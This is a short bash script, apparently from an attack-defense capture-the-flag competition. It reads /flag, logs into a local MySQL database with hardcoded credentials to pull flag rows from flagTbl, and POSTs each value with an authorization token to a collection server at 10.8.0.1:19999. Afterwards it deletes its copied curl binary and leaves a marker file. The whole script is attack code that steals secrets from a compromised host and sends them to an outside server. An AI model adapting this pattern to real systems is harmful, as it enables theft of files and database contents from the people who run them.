#!/bin/bash
cp -r /tmp/safedir/static/curl /tmp
flag1=$(cat /flag)
/tmp/curl/bin/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
mysqluser=schtar
mysqlpasswd="2021330#schtar"
flags=$(mysql -h 127.0.0.1 --user="$mysqluser" --password="$mysqlpasswd" --database="sport" --execute="select * from flagTbl" | grep hctf)
for flag in $flags
do
        echo $flag
        /tmp/curl/bin/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag\" }"
done
rm -rf /tmp/curl
echo yes > /tmp/.fuckyou
